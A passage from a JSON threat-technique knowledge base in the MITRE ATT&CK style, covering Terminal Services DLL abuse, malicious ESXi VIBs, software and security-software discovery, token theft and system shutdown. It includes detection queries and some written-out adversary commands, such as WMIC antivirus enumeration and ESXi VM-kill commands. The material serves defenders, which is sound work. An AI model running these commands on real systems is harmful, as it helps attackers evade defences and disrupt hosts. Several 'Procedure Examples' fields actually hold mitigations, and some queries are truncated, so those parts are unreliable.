    "Description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.[1]Windows Services that are run as a \"generic\" process (ex:svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry namedServiceDll.[2]Thetermsrv.dllfile, typically stored in%SystemRoot%\\System32\\, is the defaultServiceDllvalue for Terminal Services inHKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\.Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.[3]Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normaltermsrv.dllfunctionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrentRemote Desktop Protocolsessions by either patching thetermsrv.dllfile or modifying theServiceDllvalue to point to a DLL that provides increased RDP functionality.[4][5]On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
    "Detects": [
      "Monitor executed commands and arguments for potential adversary actions to modify Registry values (ex:reg.exe) or modify/replace the legitimatetermsrv.dll.",
      "Monitor unexpected changes and/or interactions withtermsrv.dll, which is typically stored in%SystemRoot%\\System32\\.",
      "Monitor module loads by the Terminal Services process (ex:svchost.exe -k termsvcs) for unexpected DLLs (the default is%SystemRoot%\\System32\\termsrv.dll, though an adversary could also useMatch Legitimate Resource Name or Locationto potentially conceal a malicious payload).",
      "Monitor processes with arguments that may potentially highlight adversary actions to modify Registry values (ex:reg.exe) or modify/replace the legitimatetermsrv.dll.",
      "Monitor for changes to Registry keys associated withServiceDlland other subkey values underHKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\."
    ],
    "Procedure Examples": [
      "Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made.",
      "Consider using Group Policy to configure and block modifications to Terminal Services parameters in the Registry.[2]"
    ]
  },
  "T1505.006": {
    "Name": "Server Software Component:vSphere Installation Bundles",
    "Description": "Adversaries may abuse vSphere Installation Bundles (VIBs) to establish persistent access to ESXi hypervisors. VIBs are collections of files used for software distribution and virtual system management in VMware environments. Since ESXi uses an in-memory filesystem where changes made to most files are stored in RAM rather than in persistent storage, these modifications are lost after a reboot. However, VIBs can be used to create startup tasks, apply custom firewall rules, or deploy binaries that persist across reboots. Typically, administrators use VIBs for updates and system maintenance.VIBs can be broken down into three components:[1]VIB payload: a.vgzarchive containing the directories and files to be created and executed on boot when the VIBs are loaded.Signature file: verifies the host acceptance level of a VIB, indicating what testing and validation has been done by VMware or its partners before publication of a VIB. By default, ESXi hosts require a minimum acceptance level of PartnerSupported for VIB installation, meaning the VIB is published by a trusted VMware partner. However, privileged users can change the default acceptance level using theesxclicommand line interface. Additionally, VIBs are able to be installed regardless of acceptance level by using theesxcli software vib install --forcecommand.XML descriptor file: a configuration file containing associated VIB metadata, such as the name of the VIB and its dependencies.Adversaries may leverage malicious VIB packages to maintain persistent access to ESXi hypervisors, allowing system changes to be executed upon each bootup of ESXi – such as usingesxclito enable firewall rules for backdoor traffic, creating listeners on hard coded ports, and executing backdoors.[2]Adversaries may also masquerade their malicious VIB files as PartnerSupported by modifying the XML descriptor file.[2]",
    "Detects": [
      "Monitor ESXi hosts for suspicious installation of new VIBs. The/var/log/esxupdate.logfile records VIB installation, including where the VIB was downloaded from and the options used to install the VIB (such asforce/nosigcheck).[3]Analytic 1 - Detection bypassing signaturessourcetype=\"esxupdate_log\"(\"Installed\" AND (\"--force\" OR \"--no-sig-check\" OR \"acceptance level: CommunitySupported\"))| rex field=_raw \"Installed:\\s(?\\S+)\"| rex field=_raw \"Source:\\s(?\\S+)\"| table _time, host, vib_name, source_url, _raw| sort by _time desc",
      "Monitor command-line arguments that may involve installing new VIBs, such asesxcli software vib install. Especially track suspicious installation parameters, such as the--forceflag.[2]Analytic 1 - Detect VIB installationsourcetype=\"shell_log\"\"esxcli software vib install\" OR \"acceptance set\"| rex field=_raw \"esxcli software vib install\\s+(?--[^\\s]+)\"| table _time, host, user, flags, _raw| sort by _time desc"
    ],
    "Procedure Examples": [
      "Periodically audit ESXi hosts to ensure that only approved VIBs are installed. The commandesxcli software vib listlists installed VIBs, while the commandesxcli software vib signature verifyverifies the signatures of installed VIBs.[2]",
      "Enabling secure boot allows ESXi to validate software and drivers during initial system boot.[3]",
      "Enabling theexecInstalledOnlyfeature prevents unsigned binaries from being run on ESXi hosts.[3]"
    ]
  },
  "T1518": {
    "Name": "Software Discovery",
    "Description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information fromSoftware Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Such software may be deployed widely across the environment for configuration management or security reasons, such asSoftware Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable toExploitation for Privilege Escalation.",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment.",
      "Monitor for an extracted list of available firewalls and/or their associated settings/rules (ex: Azure Network Firewall CLI Show commands)",
      "Monitor for contextual data about a firewall and activity around it such as name, policy, or status",
      "Monitor for API calls that may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment.",
      "Monitor newly executed processes that may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment."
    ],
    "Procedure Examples": [
      "Bazarcan query the Registry for installed applications.[1]",
      "BRONZE BUTLERhas used tools to enumerate software installed on an infected host.[2]",
      "Bundlorehas the ability to enumerate what browser is being used as well as version information for Safari.[3]",
      "CharmPowercan list the installed applications on a compromised host.[4]",
      "TheCobalt StrikeSystem Profiler can discover applications through the browser and identify the version of Java the target has.[5]",
      "ComRATcan check the victim's default browser to determine which process to inject its communications module into.[6]",
      "Cuckoo Stealerhas the ability to search systems for installed applications.[7]",
      "down_newhas the ability to gather information on installed applications.[2]",
      "Dridexhas collected a list of installed software on the system.[8]",
      "DustySkylists all installed software for the infected machine.[9]",
      "Dyrehas the ability to identify installed programs on a compromised host.[10]",
      "HEXANEhas enumerated programs installed on an infected machine.[11]",
      "HotCroissantcan retrieve a list of applications from theSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Pathsregistry key.[12]",
      "Inceptionhas enumerated installed software on compromised systems.[13]",
      "InvisiMolecan collect information about installed software used by specific users, software executed on user login, and software executed by each system.[14][15]",
      "DuringJuicy Mix,OilRigused browser data dumper tools to create a list of users with Google Chrome installed.[16]",
      "KGH_SPYcan collect information on installed applications.[17]",
      "If sent the command16001,LightSpyuses theNSFileManger contentsOfDirectoryAtPath()to enumerate the Applications folder to collect the bundle name, bundle identifier, and version information from each application'sinfo.plistfile. The results are then converted into a JSON blob for exfiltration.[18]",
      "LunarWebcan list installed software on compromised systems.[19]",
      "MarkiRATcan check for the Telegram installation directory by enumerating the files on disk.[20]",
      "Metamorfohas searched the compromised system for banking applications.[21][22]",
      "MuddyWaterhas used a PowerShell backdoor to check for Skype connectivity on the target machine.[23]",
      "Mustang Pandahas searched the victim system for theInstallUtil.exeprogram and its version.[24]",
      "DuringOperation Dust Storm, the threat actors deployed a file calledDeployJava.jsto fingerprint installed software on a victim system prior to exploit delivery.[25]",
      "DuringOperation Wocao, threat actors collected a list of installed software on the infected system.[26]",
      "Orzcan gather the victim's Internet Explorer version.[27]",
      "P.A.S. Webshellcan list PHP server configuration details.[28]",
      "QakBotcan enumerate a list of installed programs.[29]",
      "Raccoon Stealeris capable of identifying running software on victim machines.[30][31]",
      "RTMcan scan victim drives to look for specific banking software on the machine to determine next actions.[32]",
      "Samuraican check for the presence and version of the .NET framework.[33]",
      "ShimRatReportergathered a list of installed software on the infected host.[34]",
      "SideCopyhas collected browser information from a compromised host.[35]",
      "Sidewinderhas used tools to enumerate software installed on an infected host.[36][37]",
      "Siloscapesearches for the kubectl binary.[38]",
      "SocGholishcan identify the victim's browser in order to serve the correct fake update page.[39]",
      "SpicyOmelettecan enumerate running software on a targeted system.[40]",
      "StrelaStealervariants use COM objects to enumerate installed applications from the \"AppsFolder\" on victim machines.[41]",
      "SUGARDUMPcan identify Chrome, Opera, Edge Chromium, and Firefox browsers, including version number, on a compromised host.[42]",
      "SVCReadycan collect a list of installed software from an infected host.[43]",
      "TajMahalhas the ability to identify the Internet Explorer (IE) version on an infected host.[44]",
      "Tropic Trooper's backdoor could list the infected system's installed software.[45]",
      "Volt Typhoonhas queried the Registry on compromised systems for information on installed software.[46][47]",
      "Windigohas used a script to detect installed software on targeted systems.[48]",
      "Windshifthas used malware to identify installed software.[49]",
      "Wizard Spiderhas utilized the PowerShell scriptGet-DataInfo.ps1to collect installed backup software information from a compromised machine.[50]",
      "Woody RATcan collect .NET, PowerShell, and Python information from an infected host.[51]",
      "XCSSETusesps auxwith thegrepcommand to enumerate common browsers and system processes potentially impactingXCSSET's exfiltration capabilities.[52]"
    ]
  },
  "T1518.001": {
    "Name": "Software Discovery:Security Software Discovery",
    "Description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information fromSecurity Software Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Example commands that can be used to obtain security software information arenetsh,reg querywithReg,dirwithcmd, andTasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.Adversaries may also utilize theCloud APIto discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment.Note: For Windows, Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on potential Security Software Discovery.",
      "Monitor for an extracted list of available firewalls and/or their associated settings/rules (ex: Azure Network Firewall CLI Show commands)",
      "Monitor for contextual data about a firewall and activity around it such as name, policy, or status",
      "Monitor for API calls that may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. OS API calls associated with LSASS process dumping include EnumProcesses, which can be used to enumerate the set of processes running on a host and filtered to look for security-specific processes.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.",
      "Monitor newly executed processes that may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment."
    ],
    "Procedure Examples": [
      "ABKhas the ability to identify the installed anti-virus product on the compromised host.[1]",
      "Action RATcan identify AV products on an infected host using the following command:cmd.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List.[2]",
      "Amadeyhas checked for a variety of antivirus products.[3][4]",
      "APT38has identified security software, configurations, defensive tools, and sensors installed on a compromised system.[5][6]",
      "APT42has used Windows Management Instrumentation (WMI) to check for anti-virus products.[7]",
      "Aquatic Pandahas attempted to discover third party endpoint detection and response (EDR) tools on compromised systems.[8]",
      "Astarothchecks for the presence of Avast antivirus in theC:\\Program\\Files\\folder.[9]",
      "AuTo Stealerhas the ability to collect information about installed AV products from an infected host.[2]",
      "Avengerhas the ability to identify installed anti-virus products on a compromised host.[1]",
      "BadPatchuses WMI to enumerate installed security products in the victim’s environment.[10]",
      "Bazarcan identify the installed antivirus engine.[11]",
      "BlackByteenumerated installed security products during operations.[12]",
      "BlackByte Ransomwarelooks for security software products prior to full execution.[13]",
      "BLUELIGHTcan collect a list of anti-virus products installed on a machine.[14]",
      "Brute Ratel C4can detect EDR userland hooks.[15]",
      "build_downerhas the ability to detect if the infected host is running an anti-virus process.[1]",
      "Bumblebeecan identify specific analytical tools based on running processes.[16][17][18]",
      "Carberphas queried the infected system's registry searching for specific registry keys associated with antivirus products.[19]",
      "CHIMNEYSWEEPis capable of checking whether a compromised device is running DeepFreeze by Faronics.[20]",
      "CHOPSTICKchecks for antivirus and forensics software.[21]",
      "Clopcan search for processes with antivirus and antimalware product names.[22][23]",
      "Cobalt Groupused a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.[24]",
      "Comnieattempts to detect several anti-virus products.[25]",
      "CookieMinerhas checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found.[26]",
      "The mainCozyCardropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit.[27]",
      "Crimsoncontains a command to collect information about anti-virus software on the victim.[28][29]",
      "DarkGatelooks for various security products by process name using hard-coded values in the malware.[30]DarkGatewill not execute its keylogging thread if a process name associated with Trend Micro anti-virus is identified, or if runtime checks identify the presence of Kaspersky anti-virus.DarkGatewill initiate a new thread if certain security products are identified on the victim, and recreate any malicious files associated with it if it determines they were removed by security software in a new system location.[31]",
      "Darkhotelhas searched for anti-malware strings and anti-virus processes running on the system.[32][33]",
      "DarkTortillacan check for the Kaspersky Anti-Virus suite.[34]",
      "DarkWatchmancan search for anti-virus products on the system.[35]",
      "down_newhas the ability to detect anti-virus products and processes on a compromised host.[1]",
      "DUSTTRAPcan identify security software.[36]",
      "DustySkychecks for the existence of anti-virus.[37]",
      "Empirecan enumerate antivirus software on the target.[38]",
      "Epicsearches for anti-malware services running on the victim’s machine and terminates itself if it finds them.[39]",
      "EvilBunnyhas been observed querying installed antivirus software.[40]",
      "EVILNUMcan search for anti-virus products on the system.[41]",
      "Exbytechecks for the presence of various security software products during execution.[42]",
      "Felismuschecks for processes associated with anti-virus vendors.[43]",
      "FELIXROOTchecks for installed security software like antivirus and firewall.[44]",
      "Ferocioushas checked for AV software as part of its persistence process.[45]",
      "FIN8has used Registry keys to detect and avoid executing in potential sandboxes.[46]",
      "FinFisherprobes the system to check for antimalware processes.[47][48]",
      "Flameidentifies security software such as antivirus through the Security module.[49][50]",
      "FlawedAmmyywill attempt to detect anti-virus products during the initial infection.[51]",
      "DuringFrankenstein, the threat actors used WMI queries to determine if analysis tools were running on a compromised system.[52]",
      "FunnyDreamcan identify the processes for Bkav antivirus.[53]",
      "Gelsemiumcan check for the presence of specific security products.[54]",
      "Gold Dragonchecks for anti-malware products and processes.[55]",
      "Grandoreirocan list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections.[56][56]",
      "IcedIDcan identify AV products on an infected host using the following command:WMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List.[57][58]",
      "InvisiMolecan check for the presence of network sniffers, AV, and BitDefender firewall.[59]",
      "JPINchecks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.[60]",
      "jRATcan list security software, such as by using WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.[61][62]",
      "Kasidethas the ability to identify any anti-virus installed on the infected system.[63]",
      "Kimsukyhas checked for the presence of antivirus software withpowershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct.[64]",
      "KV Botnet Activityinvolved removal of security tools, as well as other identified IOT malware, from compromised devices.[65]",
      "Latrodectushas the ability to identify installed antivirus products.[66][67]",
      "LiteDukehas the ability to check for the presence of Kaspersky security software.[68]",
      "LitePowercan identify installed AV software.[45]",
      "Lizarcan search for processes associated with an anti-virus product from list.[69]",
      "Lumma Stealerhas detected antivirus processes using commands such as \"tasklist\" and \"findstr.\"[70]",
      "LunarWebhas run shell commands to obtain a list of installed security products.[71]",
      "Mafaldacan search for a variety of security software programs, EDR systems, and malware analysis tools.[72][73]",
      "Malteirocollects the installed antivirus on the victim machine.[74]",
      "MarkiRATcan check for running processes on the victim’s machine to look for Kaspersky and Bitdefender antivirus products.[75]",
      "Metamorfocollects a list of installed antivirus software from the victim’s system.[76][77]",
      "Meteorhas the ability to search for Kaspersky Antivirus on a victim's machine.[78]",
      "Micropsiasearches for anti-virus software and firewall products installed on the victim’s machine using WMI.[79][80]",
      "Mispaducan list installed security products in the victim’s environment.[81][82]",
      "MoleNetcan use WMI commands to check the system for firewall and antivirus software.[83]",
      "More_eggscan obtain information on installed anti-malware programs.[84]",
      "Mosquito's installer searches the Registry and system to see if specific antivirus tools are installed on the system.[85]",
      "MuddyWaterhas used malware to check running processes against a hard-coded list of security tools often used by malware researchers.[86]",
      "Naikonuses commands such asnetsh advfirewall firewallto discover local firewall settings.[87]",
      "netshcan be used to discover system firewall settings.[88][89]",
      "Netwalkercan detect and terminate active security software-related processes on infected systems.[90]",
      "NotPetyadetermines if specific antivirus programs are running on an infected host machine.[91]",
      "DuringOperation Wocao, threat actors used scripts to detect security software.[92]",
      "Pacucan enumerate AWS security services, including WAF rules and GuardDuty detectors.[93]",
      "Patchworkscanned the \"Program Files\" directories for a directory with the string \"Total Security\" (the installation path of the \"360 Total Security\" antivirus tool).[94]",
      "PipeMoncan check for the presence of ESET and Kaspersky security software.[95]",
      "Playhas used the information-stealing tool Grixba to scan for anti-virus software.[96]",
      "POWERSTATShas detected security tools.[97]",
      "POWRUNERmay collect information on the victim's anti-virus software.[98]",
      "A module inPrikormkacollects information from the victim about installed anti-virus software.[99]",
      "PUNCHBUGGYcan gather AVs registered in the system.[100]",
      "QakBotcan identify the installed antivirus product on a targeted system.[101][102][102][103]",
      "Raspberry Robinattempts to identify security software running on the victim machine, such as BitDefender, Avast, and Kaspersky.[104][105]",
      "Remsechas a plugin detect security products via active drivers.[106]",
      "Rockeused scripts which detected and uninstalled antivirus software.[107][108]",
      "RogueRobinenumerates running processes to search for Wireshark and Windows Sysinternals suite.[109][110]",
      "RTMcan obtain information about security software on the victim.[111]",
      "SideCopyuses a loader DLL file to collect AV product names from an infected host.[2]",
      "Sidewinderhas used the Windows servicewinmgmts:\\.\\root\\SecurityCenter2to check installed antivirus products.[112]",
      "SILENTTRINITYcan determine if an anti-virus product is installed through the resolution of the service's virtual SID.[113]",
      "Skidmaphas the ability to check if/usr/sbin/setenforceexists. This file controls what mode SELinux is in.[114]",
      "SpicyOmelettecan check for the presence of 29 different antivirus tools.[115]",
      "StoneDrillcan check for antivirus and antimalware programs.[116]",
      "StreamExhas the ability to scan for security tools such as firewalls and antivirus tools.[117]",
      "StrongPitycan identify if ESET or BitDefender antivirus are installed before dropping its payload.[118]",
      "Stuxnetenumerates the currently running processes related to a variety of security products.[119]",
      "SUNBURSTchecked for a variety of antivirus/endpoint detection agents prior to execution.[120][121]",
      "T9000performs checks for various antivirus and security products during installation.[122]",
      "TA2541has used tools to search victim systems for security products such as antivirus and firewall software.[123]",
      "TajMahalhas the ability to identify which anti-virus products, firewalls, and anti-spyware products are in use.[124]",
      "TAMECAThas used Windows Management Instrumentation (WMI) to check for anti-virus products.[7]",
      "Tasklistcan be used to enumerate security software currently running on a system by process name of known products.[125]",
      "TeamTNThas searched for security products on infected machines.[126][127]",
      "The White Companyhas checked for specific antivirus products on the target’s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.[128]",
      "ThiefQuestuses thekill_unwantedfunction to get a list of running processes, compares each process with an encrypted list of \"unwanted\" security related programs, and kills the processes for security related programs.[129]",
      "ToddyCatcan determine is Kaspersky software is running on an endpoint by runningcmd /c wmic process where name=\"avp.exe\".[130]",
      "Tropic Troopercan search for anti-virus software running on the system.[131]",
      "Turlahas obtained information on security software, including security logging information that may indicate whether their malware has been detected.[132]",
      "Valakcan determine if a compromised host has security products installed.[133]",
      "VERMINuses WMI to check for anti-virus software installed on the system.[134]",
      "Waterbearcan find the presence of a specific security software.[135]",
      "WhisperGatecan recognize the presence of monitoring tools on a target system.[136]",
      "Windshifthas used malware to identify installed AV and commonly used forensic and malware analysis tools.[137]",
      "Wingbirdchecks for the presence of Bitdefender security software.[138]",
      "Wizard Spiderhas used WMI to identify anti-virus products installed on a victim's machine.[139]",
      "Woody RATcan detect Avast Software, Doctor Web, Kaspersky, AVG, ESET, and Sophos antivirus programs.[140]",
      "xCaonhas checked for the existence of Kaspersky antivirus software on the system.[141]",
      "XCSSETsearches firewall configuration files located in/Library/Preferences/and usescsrutil statusto determine if System Integrity Protection is enabled.[142]",
      "YAHOYAHchecks for antimalware solution processes on the system.[143]",
      "Zeus Pandachecks to see if anti-virus, anti-spyware, or firewall products are installed in the victim’s environment.[144][145]",
      "ZxxZcan search a compromised host to determine if it is running Windows Defender or Kasperky antivirus.[146]"
    ]
  },
  "T1525": {
    "Name": "Implant Internal Image",
    "Description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. UnlikeUpload Malware, this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.[1]A tool has been developed to facilitate planting backdoors in cloud container images.[2]If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as aWeb Shell.[1]",
    "Detects": [
      "Monitor interactions with images and containers by users to identify ones that are added anomalously.",
      "Periodically baseline virtual machine images to identify malicious modifications or additions.",
      "Monitor interactions with images and containers by users to identify ones that are modified anomalously.In containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration."
    ],
    "Procedure Examples": [
      "Periodically check the integrity of images and containers used in cloud deployments to ensure they have not been modified to include malicious software.",
      "Several cloud service providers support content trust models that require container images be signed by trusted sources.[3][4]",
      "Limit permissions associated with creating and modifying platform images or containers based on the principle of least privilege."
    ]
  },
  "T1526": {
    "Name": "Cloud Service Discovery",
    "Description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.[1][2]For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.[3][4]Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses throughDisable or Modify ToolsorDisable or Modify Cloud Logs.",
    "Detects": [
      "Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.",
      "Monitor for newly constructed logon behavior that may attempt to enumerate the cloud services running on a system after gaining access. Look for suspicious Applications and accounts authenticating to the Windows Azure Service Management API using User Agents values attributed to scripting utilities such as python or Powershell.Analytic 1 - Applications or accounts with unusual User Agents, anomalous IP addresses, unexpected locations, and usernamesindex=\"azure_ad_signin_logs\" Resource=\"Windows Azure Service Management API\" AND (UserAgent=\"python\" OR UserAgent=\"PowerShell\")| stats count by UserAgent, UserID, IPAddress, Location| where IPAddress!=\"expected_ip\" OR Location!=\"expected_location\"the new"
    ],
    "Procedure Examples": [
      "AADInternalscan enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.[5]",
      "Pacucan enumerate AWS services, such as CloudTrail and CloudWatch.[4]",
      "ROADToolscan enumerate Azure AD applications and service principals.[6]"
    ]
  },
  "T1528": {
    "Name": "Steal Application Access Token",
    "Description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).[1]Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands.[2]Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.[3]If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.In Azure, an adversary who compromises a resource with an attached Managed Identity, such as an Azure VM, can request short-lived tokens through the Azure Instance Metadata Service (IMDS). These tokens can then facilitate unauthorized actions or further access to other Azure services, bypassing typical credential-based authentication.[4][5]Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.[6][7]An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.[8][9]The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.[10]Then, they can send aSpearphishing Linkto the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account throughApplication Access Token.[11]Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens[12], allowing them to obtain new access tokens without prompting the user.",
    "Detects": [
      "Monitor M365 Audit logs for the Operations Add app role assignment grant to user and/or Consent to application occurring against AzureActiveDirectory Workloads.Analytic 1 - Unusual app role assignments or consents to applications.index=security sourcetype=\"WinEventLog:Security\" EventCode=5136 OR (index=azuread sourcetype=\"azure:activity\" operationName=\"Add member to role\" OR operationName=\"Update application\" OR operationName=\"Update servicePrincipal\") OR(index=gsuite sourcetype=\"gsuite:admin\" event_type=\"UPDATE_GROUP\" OR event_type=\"UPDATE_USER\") OR(index=o365 sourcetype=\"o365:management:activity\" operation IN (\"Add member to role\", \"Update user\", \"Update group\"))",
      "Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a \"High severity app permissions\" policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old \"Last authorized\" fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.Analytic 1 - Unauthorized app permissions or unusual activity patterns in app logs.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4720 OR EventCode=4722 OR EventCode=4738) OR(index=azuread sourcetype=\"azure:activity\" operationName IN (\"Add member to role\", \"Update user\", \"Update group\")) OR(index=gsuite sourcetype=\"gsuite:admin\" event_type IN (\"UPDATE_USER\", \"ADD_USER_TO_GROUP\")) OR(index=o365 sourcetype=\"o365:management:activity\" operation IN (\"Add member to role\", \"Update user\", \"Update group\"))"
    ],
    "Procedure Examples": [
      "AADInternalscan steal users’ access tokens via phishing emails containing malicious links.[13]",
      "APT28has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\".[9]",
      "APT29uses stolen tokens to access victim accounts, without needing a password.[14]",
      "Leviathanabused access to compromised appliances to collect JSON Web Tokens (JWTs), used for creating virtual desktop sessions, duringLeviathan Australian Intrusions.[15]",
      "Peiratesgathers Kubernetes service account tokens using a variety of techniques.[16]"
    ]
  },
  "T1529": {
    "Name": "System Shutdown/Reboot",
    "Description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device viaNetwork Device CLI(e.g.reload).[1][2]They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such asDisk Structure WipeorInhibit System Recovery, to hasten the intended effects on system availability.[3][4]",
    "Detects": [
      "Monitor executed commands and arguments of binaries involved in shutting down or rebooting systems. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users. On ESXi servers, monitor for suspicious commands that terminate VMs, such asesxcli vm process kill,pkill –9 vmx-*, orvim-cmd vmsvc/power.off.[30][31][32]",
      "Monitor for newly executed processes of binaries involved in shutting down or rebooting systems.",
      "Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications) that may suggest the shutting down or rebooting of the system. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006."
    ],
    "Procedure Examples": [
